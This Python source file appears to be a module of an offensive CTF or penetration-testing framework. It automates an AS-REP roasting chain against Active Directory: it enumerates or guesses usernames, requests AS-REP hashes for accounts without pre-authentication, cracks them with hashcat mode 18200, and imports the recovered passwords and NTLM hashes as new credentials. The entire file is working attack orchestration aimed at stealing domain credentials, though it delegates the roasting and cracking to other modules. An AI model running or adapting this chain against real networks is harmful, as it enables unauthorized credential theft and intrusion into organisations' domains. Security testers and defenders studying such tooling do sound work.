def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_chain_artifacts_dir

    data, _ = load_current_profile()
    creds = get_all_creds(data)
    artifacts = get_chain_artifacts_dir(data["name"], "asrep")

    usernames = artifacts / "usernames.txt"
    hashes = artifacts / "asrep_hashes.txt"
    cracked = artifacts / "cracked.txt"

    # ---------------- PRECHECK ----------------
    if not data.get("domain") or not data.get("ip"):
        print("[!] Error: Domain and IP must be set in the profile.")
        return

    if not getattr(args, "auto", False):
        if not input(f"[?] Start AS-REP Roast -> Crack -> Import chain? (Y/n): ").lower() in ["", "y"]:
            return

    # ---------------- STEP 1: Get Usernames ----------------
    if not usernames.exists() or usernames.stat().st_size == 0:
        if creds:
            print("[*] Step 1: Enumerating users via LDAP...")
            run_module_by_name("ad.enum-users", ["--out", str(usernames), "--quiet"], data)
        else:
            extra = getattr(args, "extra", [])
            if not extra:
                print("[-] No credentials for LDAP and no wordlist provided via 'ctf ad.asrep <wordlist>'")
                return
            
            print(f"[*] Step 1: Generating usernames from wordlist: {extra[0]}")
            run_module_by_name("wordlist.gen-usernames", [extra[0], str(usernames), "--quiet"], data)
        
        if not ensure_nonempty_file(usernames, "No usernames identified."):
            return
    else:
        print(f"[*] Step 1: Skipping (Usernames exist at {usernames.name})")

    # ---------------- STEP 2: AS-REP Roast ----------------
    if not hashes.exists() or hashes.stat().st_size == 0:
        print("[*] Step 2: Performing AS-REP Roasting...")
        # Note: assuming ad.asreproast takes (userfile, outfile)
        run_module_by_name("ad.asreproast", ["--file", str(usernames), "--out", str(hashes), "--quiet"], data)
        
        if not ensure_nonempty_file(hashes, "No AS-REP hashes found (no pre-auth disabled accounts?)."):
            return
    else:
        print(f"[*] Step 2: Skipping (Hashes exist at {hashes.name})")

    # ---------------- STEP 3: Crack ----------------
    if not cracked.exists() or cracked.stat().st_size == 0:
        print("[*] Step 3: Cracking hashes with Hashcat (Mode 18200)...")
        run_module_by_name("crack.hash", [
            str(hashes), 
            "--mode", "18200", 
            "--out", str(cracked), 
            "--quiet"
        ], data)

        if not ensure_nonempty_file(cracked, "Cracking failed or no matches."):
            return
    else:
        print(f"[*] Step 3: Skipping (Cracked file exists)")

    # ---------------- STEP 4: Import ----------------
    print("[*] Step 4: Importing new credentials...")
    new_creds = run_module_by_name("parse.hash", [str(cracked)], data)

    if new_creds:
        from core.target import target_add_cred
        import argparse

        for c in new_creds:
            print(f"[+] Found: {c['user']} ({c['type']})")
            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["secret"] if c["type"] == "password" else None,
                    hash=c["secret"] if c["type"] == "ntlm" else None,
                    aes=None,
                    ccache=None
                )
            )
        print(f"[*] Successfully imported {len(new_creds)} credentials.")

    print("\n-------- AS-REP Roast Chain Complete --------")

def ensure_nonempty_file(path, msg):
    if path.exists() and path.stat().st_size > 0:
        return True
    print(f"[-] {msg}")
    return False